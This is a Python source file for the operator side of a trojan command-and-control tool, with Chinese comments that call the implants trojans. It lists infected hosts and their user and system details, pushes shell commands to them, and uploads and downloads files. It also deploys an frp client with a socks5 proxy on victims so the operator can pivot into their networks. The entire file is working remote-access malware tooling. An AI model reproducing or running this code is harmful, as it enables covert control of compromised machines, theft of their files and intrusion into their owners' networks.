import ssl
from time import sleep
from requests import post,packages
from base64 import b64decode, b64encode
from json import dumps, loads
from os import system, name
from os.path import basename,getsize,exists
from settings import *
from threading import Thread
from hashlib import md5
import sys
import socket

packages.urllib3.disable_warnings()

class BaseFunc:
    def __init__(self) -> None:
        self.send_url = "https://"+LOCAL_IP+":"+str(LOCAL_PORT)+"/addtask"
        self.get_rst = "https://"+LOCAL_IP+":"+str(LOCAL_PORT)+"/getrst"
        self.get_host = "https://"+LOCAL_IP+":"+str(LOCAL_PORT)+"/getlive"
        self.del_url = "https://"+LOCAL_IP+":"+str(LOCAL_PORT)+"/killhost"
        self.file_url = "https://"+LOCAL_IP+":"+str(LOCAL_PORT)+"/fileserver"
        self.frp_url = "https://"+LOCAL_IP+":"+str(LOCAL_PORT)+"/frpserver"
        self.pwd = md5((PASSWORD+SALT_KEY).encode("utf-8")).hexdigest()
        self.host_keys = dict()

    def sendcmd(self,key:str,cmd:str,time:str=""):
        """
        描述：
          该函数主要是负责向服务器发布 payload 的
        
        调用方法：
          sendcmd(木马的唯一身份标识ID，要执行的命令，睡眠时间)
        
        无返回数据
        """
        if isinstance(cmd,str) and isinstance(time,str):
            #{"pwd":密码,"key":木马唯一ID,"cmd":base64密文} , 密文：{"sleeptime":睡眠时间,"cdm":要执行的命令}
            data = {"pwd":self.pwd,"key":key,"cmd":str(b64encode(dumps({"sleeptime":time,"cdm":cmd}).encode("utf-8"))).split("'")[1]}
            #print("请求体：{}".format(data))
            rst = post(url=self.send_url,data=data,timeout=5,verify=False)
            if rst.status_code == 200: #得到 200 的返回值则代表成功发布任务
                rst = loads(rst.text) #{"info":响应结果}
                print(rst.get("info"))
            else:
                print("连接异常！")
        else:
            print("参数类型错误！")

    #def getrst(self):
    #    """
    #    描述：
    #      该函数是用来获取木马执行结果的
    #    
    #    调用方法：
    #      getrst()
    #    
    #    无返回结果
    #    """
    #    rst = post(url=self.get_rst,data={"pwd":self.pwd},timeout=5,verify=False)
    #    if rst.status_code == 200:
    #        print(loads(rst)) #打印执行结果
    
    def get_online_host(self):
        """
        描述:
          该函数是用来获取当前上线木马信息的
        
        调用方法：
          get_online_host()
        
        无返回结果
        """
        rst = post(url=self.get_host,data={"pwd":self.pwd},timeout=5,verify=False)
        if rst.status_code == 200:
            data = loads(rst.text)
            if data.get("data").get("info"):
                print("获取信息失败！")
            else:
                print("\n\n                                 当前存活主机信息！                                         ")
                for i,j in data.get("data").items():
                    info = j['data']
                    self.host_keys[i] = j['key']
                    #print("请求头：{}\n得到的响应：{}".format({"pwd":self.pwd},info))
                    print("\n| ID标记：{} |-| 本地IP：{} |-|外网IP：{} |-| 用户：{} |-| 系统信息：{} |".format(i,info.get('local_ip'),info.get('remote_ip'),\
                        info.get("localuser"),info.get("sys_info")))
                    print("\n")
        else:
            print("获取信息失败！")
    
    def del_host(self,host:str):
        """
        描述：
          该方法是用来删除上线木马的
        
        调用方法：
          del_host(主机ID)
        
        无返回结果
        """
        if isinstance(host,str) and host != "":
            data = {"pwd":self.pwd,"key":self.host_keys.get(host)} #{"pwd":密码,"key":木马的唯一身份标识ID}
            #print("请求正文：{}".format(data))
            r = post(url=self.del_url,data=data,timeout=5,verify=False) #{"info":结果信息}
            if r.status_code == 200:
                if loads(r.text).get("info") == "删除成功":
                    print("删除成功！")
                    sleep(1)
                    if name == "nt":
                        system("cls")
                    else:
                        pass
                        #system("clear")
                    #self.get_online_host()
                else:
                    #print("响应正文：{}".format(loads(r.text)))
                    print(loads(r.text).get("info"))
            else:
                print("服务器连接异常！")

    def help_info(self):
        #该方法是用来打印帮助信息的
        print("""
        查看当前上线主机

            getlive

        对上线主机进行操作

            set 主机ID 操作[shell,time,uploadfile,downfile,del,frp] 参数

            例：
              set 主机ID shell 你要执行的系统命令
              set 主机ID time 你要设定的时间(如果时间小于零则默认设置为10)
              set 主机ID uploadfile 要上传的文件路径 目标路径
              set 主机ID downfile 目标文件路径
              set 主机ID del(删除主机)
              set 主机ID shell exit_yes(执行此命令木马会停止运行)
              set 主机ID frp windows/linux(这里是指定目标机的系统平台):x64/x86(指定使用 frp 程序架构) 端口号

        查看帮助
            help

        要退出请按两次 ctrl + c

        """)
    
    def openfileserver(self) -> bool:
        """
        描述：
          该方法是用来请求服务器开启文件传输服务的
        
        调用方法:
          openfileserver()
    
        """
        data = {"pwd":self.pwd}
        r = post(url=self.file_url,data=data,timeout=5,verify=False).status_code
        if r == 404: #开启成功状态码是 404
            return True
        else:
            return False

    def uploadfile(self,host_key:str,filepath:str,targetfilepath:str):
        """
        描述：
          该方法是用来处理上传文件的
        
        调用方法：
          uploadfile(木马唯一身份ID,要上传的文件路径,要写入文件的目标文件路径)
        
        返回数据：
          成功返回 0 失败返回 -1
        """
        if exists(filepath.strip()): #判断要上传的文件是否存在
            pass
        else:
            print("文件不存在！")
            return -1
        if targetfilepath.strip()[-1] == "/": #判断格式是否合法，即符合 /目标目录/ 
            pass
        else:
            targetfilepath = targetfilepath+"/"
        #请求服务器开启文件代理传输服务
        if self.openfileserver():
            print("文件服务开启成功！")
        else:
            print("文件服务开启失败！")
            return -1
        self.sendcmd(host_key,"uploadfile") #向服务器发布任务
        print("发布任务！\n正在等待木马端连接...")
        sleep(2) #等待两秒等文件服务器真正开启
        s = socket.socket()
        s.connect((LOCAL_IP,60000))
        s.send("c".encode("utf-8")) #向文件传输代理服务发送身份标识，c 表示我是文件发送方
        switch = True
        filename = basename(filepath) #获取文件名称
        filesize = getsize(filepath) #获取文件大小
        #接收文件服务器发来的对接成功信息
        while True:
            data = s.recv(1024)
            if data:
                isok = loads(data.decode("utf-8")) #{"info":yes}
                break
        if isinstance(isok,dict) and isok.get("info") == "yes":
            print("对接成功！正在上传文件...")
            while switch:
                #文件头部信息：{"filename":文件名称,"filesize":文件大小,"filewritedir":要写入的目标路径}
                filehead = {"filename":filename,"filesize":filesize,"filewritedir":targetfilepath}
                #{"whoami":"c","data":base64密文}
                data = {"whoami":"c","data":str(b64encode(dumps(filehead).encode("utf-8")))}
                if data.get("data") == "exit":
                    #如果出现问题，就发送退出信号
                    s.send(dumps(data).encode("utf-8"))
                    break
                #正常发送文件头部信息到木马端
                s.send(dumps(data).encode("utf-8"))
                sleep(1)
                data = {"whoami":"c","data":"senddata"}
                #发送就绪信息到木马端，木马端接收到该信息后就会进行接收工作
                s.send(dumps(data).encode("utf-8"))
                sleep(1)
                #发送文件数据
                with open(filepath,"rb") as fp:
                    while filesize >0:
                        content = fp.read(1024)
                        filesize -= len(content) #对长度进行校验，因为 socket 的优化
                        s.sendall(content)
                        if filesize == 0:
                            switch = False
                            break
        while True:
            #接收对端的退出信息
            data = s.recv(1024)
            if data:
                data = data.decode("utf-8")
                if data == "exit":
                    print("文件上传成功！")
                    break
        #向文件服务器发送退出信息
        s.send(dumps({"whoami":"exit"}).encode("utf-8"))
        s.close()
        return 0


    def downfile(self,host_key:str,filepath):
        """
        描述：
          该方法是用来处理下载文件的
        
        调用方法：
          downfile(木马的唯一ID,要下载的文件路径)
        """
        if self.openfileserver(): #请求服务器开启文件服务
            print("文件服务开启成功！")
        else:
            print("文件服务开启失败！")
            return -1
        print("正在下载文件：{} ...".format(filepath))
        self.sendcmd(host_key,filepath) #向服务器发布任务
        print("发布任务！\n正在等待木马端连接...")
        sleep(2)
        s = socket.socket()
        s.connect((LOCAL_IP,60000))
        s.send("t".encode("utf-8"))
        filename = ''
        filesize = ''
        filewritedir = ''
        data = s.recv(1024)
        if data:
            try:
                data = data.decode("utf-8")
                print("木马连接成功!!!")
                data = data.split("'")[1]
                data = loads(b64decode(data).decode("utf-8")) #获取文件头部信息
                filename = data.get("filename")
                filesize = data.get("filesize")
                #如果是异常头部则代表目标文件有问题
                if filename == "nofile" and filesize == -1:
                    s.send(dumps({"whoami":"exit"}).encode("utf-8"))
                    s.close() 
                    print('文件不存在！')
                    return ''
                filewritedir = "./downfile/"#设置默认存放文件的路径
                with open(filewritedir+filename,"wb") as fp:
                    print("正在下载...")
                    if isinstance(data,str):
                        data = data.encode("utf-8")
                        filesize -= len(data) #文件长度校验
                        fp.write(data)
                    while filesize >0:
                        data = s.recv(1024)
                        if data:
                            filesize -= len(data)
                            fp.write(data)
                            if filesize == 0:
                                fp.flush()
                                s.send(dumps({"whoami":"t","data":"exit"}).encode("utf-8")) #向文件发送方发送退出信息
            except:
                pass
        sleep(1)
        s.send(dumps({"whoami":"exit"}).encode("utf-8")) #向服务器发送退出信息
        print("下载完成！！！")
        s.close() 
    
    def frp_built(self, host_key:str, plat:str, port:str):
        """
        描述：
          该方法是用来处理一键搭建 FRP 反向代理的
        
        调用方法：
          frp_built(木马唯一ID,目标系统平台,端口)
        
        返回数据：
          成功返回 None 失败返回 -1
        """
        #校验系统平台信息
        plat = plat.strip().lower()
        if plat == "linux:x64":
            filepath = "./software/frp/frpc_x64"
        elif plat == "linux:x86":
            filepath = "./software/frp/frpc_x86"
        elif plat == "windows:x64":
            filepath = "./software/frp/frpc_x64.exe"
        elif plat == "windows:x86":
            filepath = "./software/frp/frpc_x86.exe"
        else:
            print("现不支持该操作系统平台！！！")
            return -1
        #对设置的端口进行校验
        if port == "60000" or port == str(LOCAL_PORT):
            print("该端口已经被占用！！！")
            return -1
        print("正在上传 frp 程序文件到目标机器...")
        with open("./software/frp/frpc.ini","w",encoding="utf-8") as fp:
            #写入配置文件
            contents = "[common]\ntls_enable = true\nserver_addr = "+LOCAL_IP+"\nserver_port = "+str(int(port.strip())+1)+"\n\n"\
                +"[ssh]\ntype = tcp\nremote_port = "+port.strip()+"\nplugin = socks5"
            fp.write(contents)
        f = 0
        f = self.uploadfile(host_key,filepath,"./") #上传 frpc 程序
        if f == -1:
            print("程序文件上传失败！")
            return -1
        sleep(2)
        f = self.uploadfile(host_key,"./software/frp/frpc.ini","./") #上传配置文件
        if f == -1:
            print("配置文件上传失败！")
            return -1
        else:
            #启动 frp 服务端
            print("正在开启服务器端口...")
            r = post(url=self.frp_url,data={"pwd":self.pwd,"port":port},timeout=5,verify=False).status_code
            if r == 404:
                print("frp服务端启动成功！")
            else:
                print("frp服务端启动失败！")
                return -1
            print("下发任务!")
            if plat.split(":")[0] == "linux":
                self.sendcmd(host_key,"chmod +x ./"+basename(filepath)+"&&nohup ./"+basename(filepath)+" -c ./frpc.ini &")
            else:
                self.sendcmd(host_key,".\\"+basename(filepath)+" -c .\\frpc.ini")
        pass

    def opt_deal(self,opt:str):
        """
        描述：
          该函数主要负责处理用户输入的操作的，检验操作合法性,以及根据操作调用对应的方法
        """
        opt_ = opt.strip().split(' ')
        if opt_[0].strip() == "set":
            if opt_[2].strip() == "shell":
                if {opt_[1].strip()} & {i for i in self.host_keys.keys()} == {opt_[1].strip()}:
                    self.sendcmd(self.host_keys.get(opt_[1].strip()),opt.split("shell")[1].strip())
                else:
                    print("主机不存在！")
            elif opt_[2].strip() == "time":
                if {opt_[1].strip()} & {i for i in self.host_keys.keys()} == {opt_[1].strip()}:
                    self.sendcmd(self.host_keys.get(opt_[1].strip()),cmd="set time",time=opt.split("time")[1].strip())
                else:
                    print("主机不存在！")
            elif opt_[2].strip() == "del":
                if {opt_[1].strip()} & {i for i in self.host_keys.keys()} == {opt_[1].strip()}:
                    self.del_host(opt_[1].strip())
                else:
                    print("主机不存在！")
            elif opt_[2].strip() == "uploadfile":
                file = opt.split("uploadfile")[1].split(" ")
                if {opt_[1].strip()} & {i for i in self.host_keys.keys()} == {opt_[1].strip()}:
                    try:
                        if file[1].strip and file[2].strip():
                            self.uploadfile(self.host_keys.get(opt_[1].strip()),file[1].strip(),file[2].strip())
                        else:
                            print("参数错误！")
                    except IndexError:
                        print("参数错误！")
                else:
                    print("主机不存在！")
            elif opt_[2].strip() == "downfile":
                if {opt_[1].strip()} & {i for i in self.host_keys.keys()} == {opt_[1].strip()}:
                    try:
                        if opt_[1].strip() and opt_[2].strip() and opt_[3].strip():
                            self.downfile(self.host_keys.get(opt_[1].strip()),opt_[2].strip()+" "+opt_[3].strip())
                        else:
                            print("参数错误！")
                    except IndexError:
                        print("参数错误！")
                else:
                    print("主机不存在！")
            elif opt_[2].strip() == "frp":
                if {opt_[1].strip()} & {i for i in self.host_keys.keys()} == {opt_[1].strip()}:
                    try:
                        if opt_[1].strip() and opt_[3].strip() and opt_[4].strip():
                            self.frp_built(self.host_keys.get(opt_[1].strip()),opt_[3].strip(),opt_[4].strip())
                        else:
                            print("参数错误！")
                    except:
                        print("参数错误！")
            else:
                print("操作不支持！")
        elif opt_[0].strip() == "getlive":
            if name == "nt":
                system("cls")
            else:
                system("clear")
            self.get_online_host()

        elif opt_[0].strip() == "help":
            self.help_info()
       
        else:
            print("操作不支持！")